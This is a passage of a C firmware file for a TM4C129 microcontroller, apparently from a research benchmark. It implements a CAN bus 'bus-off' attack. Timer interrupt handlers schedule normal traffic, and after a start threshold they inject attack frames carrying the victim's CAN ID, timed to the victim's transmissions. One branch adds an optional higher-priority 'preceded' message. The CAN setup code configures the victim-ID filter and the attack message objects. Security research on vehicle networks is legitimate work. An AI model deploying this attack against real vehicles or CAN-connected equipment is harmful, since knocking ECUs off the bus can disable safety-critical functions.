Ipsitakoley/tm4c129-canbus/sae-benchmark/busoff/timers.c
    if ( count % 2 == 0 ) {
        CANMessageSet(CAN0_BASE, TXMIDOBJECT, &g_sCAN0TxMessageMid,
                  MSG_OBJ_TYPE_TX);
    }

    if ( count % 200 == 0 ) {
        CANMessageSet(CAN0_BASE, TXOBJECT, &g_sCAN0TxMessage,
                  MSG_OBJ_TYPE_TX);

        HWREGBITW(&g_ui32Flags, 0) ^= 1;
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_0, g_ui32Flags);
    }
}

void
Timer0IntHandler(void)
{
    int count;

    if (g_sync == 2) {
        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL); /* Fixup period */
        g_sync = 0;
        g_parity = g_ui32TXCount % 2;
    }

    //
    // Clear the timer interrupt.
    //
    ROM_TimerIntClear(TIMER0_BASE, TIMER_TIMA_TIMEOUT);
    count = ++g_ui32TXCount;

    send_messages(count);

    if ( count % 400 == 0 ) {
        g_sync = 1;
    }

    /* attack! */
    if ( count > 3000 ) {
#if GENERATE_PRECEDED_MSG
        CANMessageSet(CAN0_BASE, TXHIGHOBJECT, &g_sCAN0TxMessageHigh,
                      MSG_OBJ_TYPE_TX); /* Preceded Msg */
#endif
        if ( count % 2 == g_parity ) {
            CANMessageSet(CAN0_BASE, TXATKOBJECT, &g_sCAN0TxMessageAttack,
                  MSG_OBJ_TYPE_TX); /* Attack Msg */
            //GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_1, 1);
        }
    }

    //
    // Update the interrupt status.
    //
#if 0
    ROM_IntMasterDisable();
    ROM_IntMasterEnable();
#endif
}

void
Timer1IntHandler(void)
{
    uint32_t count;

    ROM_TimerIntClear(TIMER1_BASE, TIMER_TIMA_TIMEOUT);

    TimerEnable(TIMER0_BASE, TIMER_A);
#if 0
    if ( g_ui32RXCount == 0 ) {
        TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL); /* Fixup period */
    }

    count = ++g_ui32RXCount;
    send_messages(count);
#endif


    //
    // Update the interrupt status.
    //
#if 0
    ROM_IntMasterDisable();
    ROM_IntMasterEnable();
#endif
}

//*****************************************************************************
//
// Setup CAN0 to both send and receive at 500KHz.
// Interrupts on
// Use PE4 / PE5
//
//*****************************************************************************
void
InitCAN0(void)
{
    //
    // For this example CAN0 is used with RX and TX pins on port A0 and A1.
    // GPIO port A needs to be enabled so these pins can be used.
    //
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOA);

    //
    // Configure the GPIO pin muxing to select CAN0 functions for these pins.
    // This step selects which alternate function is available for these pins.
    //
    GPIOPinConfigure(GPIO_PA0_CAN0RX);
    GPIOPinConfigure(GPIO_PA1_CAN0TX);

    //
    // Enable the alternate function on the GPIO pins.  The above step selects
    // which alternate function is available.  This step actually enables the
    // alternate function instead of GPIO for these pins.
    //
    GPIOPinTypeCAN(GPIO_PORTA_BASE, GPIO_PIN_0 | GPIO_PIN_1);

    //
    // The GPIO port and pins have been set up for CAN.  The CAN peripheral
    // must be enabled.
    //
    SysCtlPeripheralEnable(SYSCTL_PERIPH_CAN0);

    //
    // Initialize the CAN controller
    //
    CANInit(CAN0_BASE);

    //
    // Set up the bit rate for the CAN bus.  This function sets up the CAN
    // bus timing for a nominal configuration.  You can achieve more control
    // over the CAN bus timing by using the function CANBitTimingSet() instead
    // of this one, if needed.
    // In this example, the CAN bus is set to 125 kHz.
    //
    CANBitRateSet(CAN0_BASE, g_ui32SysClock, BITRATE);

    //
    // Enable interrupts on the CAN peripheral.  This example uses static
    // allocation of interrupt handlers which means the name of the handler
    // is in the vector table of startup code.
    //
    CANIntEnable(CAN0_BASE, CAN_INT_MASTER | CAN_INT_ERROR | CAN_INT_STATUS);

    //
    // Enable the CAN interrupt on the processor (NVIC).
    //
    IntEnable(INT_CAN0);

#if 0
    // Loopback Test
    HWREG(CAN0_BASE + CAN_O_CTL) |= CAN_CTL_TEST;
    HWREG(CAN0_BASE + CAN_O_TST) |= CAN_TST_LBACK;
#endif

    //
    // Enable the CAN for operation.
    //
    CANEnable(CAN0_BASE);

    //
    // Initialize a message object to be used for receiving CAN messages with
    // any CAN ID.  In order to receive any CAN ID, the ID and mask must both
    // be set to 0, and the ID filter enabled.
    //
    g_sCAN0RxMessage.ui32MsgID = VICTIMID; // Only accept target/victim ID
    g_sCAN0RxMessage.ui32MsgIDMask = 0;  // Maybe mask it?
    g_sCAN0RxMessage.ui32Flags = MSG_OBJ_RX_INT_ENABLE | MSG_OBJ_USE_ID_FILTER;
    g_sCAN0RxMessage.ui32MsgLen = sizeof(g_ui8RXMsgData);

    CANMessageSet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, MSG_OBJ_TYPE_RX);

    /* TX Objects */
    g_ui8TXMsgData = 0;
    g_sCAN0TxMessage.ui32MsgID = 0xD0;
    g_sCAN0TxMessage.ui32MsgIDMask = 0;
    g_sCAN0TxMessage.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE; // TODO: disable interrupts?
    g_sCAN0TxMessage.ui32MsgLen = sizeof(g_ui8TXMsgData);
    g_sCAN0TxMessage.pui8MsgData = (uint8_t *)&g_ui8TXMsgData;

    g_ui8TXMsgDataHigh[0] = 0;
    g_sCAN0TxMessageHigh.ui32MsgID = 0xA0;
    g_sCAN0TxMessageHigh.ui32MsgIDMask = 0;
    g_sCAN0TxMessageHigh.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageHigh.ui32MsgLen = sizeof(g_ui8TXMsgDataHigh);
    g_sCAN0TxMessageHigh.pui8MsgData = (uint8_t *)&g_ui8TXMsgDataHigh;

    g_sCAN0TxMessageMid.ui32MsgID = 0xB0;
    g_sCAN0TxMessageMid.ui32MsgIDMask = 0;
    g_sCAN0TxMessageMid.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageMid.ui32MsgLen = sizeof(g_ui8TXMsgDataMid);
    g_sCAN0TxMessageMid.pui8MsgData = (uint8_t *)&g_ui8TXMsgDataMid;


    g_sCAN0TxMessageAttack.ui32MsgID = VICTIMID;
    g_sCAN0TxMessageAttack.ui32MsgIDMask = 0;
    g_sCAN0TxMessageAttack.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageAttack.ui32MsgLen = 0;
    g_sCAN0TxMessageAttack.pui8MsgData = 0;
}


//*****************************************************************************
//
// Can ERROR handling. When a message is received if there is an erro it is
// saved to g_ui32ErrFlag, the Error Flag Set. Below the flags are checked
// and cleared. It is left up to the user to add handling fuctionality if so
// desiered.
//
// For more information on the error flags please see the CAN section of the
// microcontroller datasheet.
//
// NOTE: you may experience errors during setup when only one board is powered
// on. This is caused by one board sending signals and there not being another
// board there to acknoledge it. Dont worry about these errors, they can be
// disregarded.
//
//*****************************************************************************
void
CANErrorHandler(void)
{
    //
    // CAN controller has entered a Bus Off state.
    //
    if(g_ui32ErrFlag & CAN_STATUS_BUS_OFF)
    {
        //
        // Handle Error Condition here
        //
        //UARTprintf("    ERROR: CAN_STATUS_BUS_OFF \n");
// TODO: LED Status?
        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, 1);
        //
        // Clear CAN_STATUS_BUS_OFF Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_BUS_OFF);

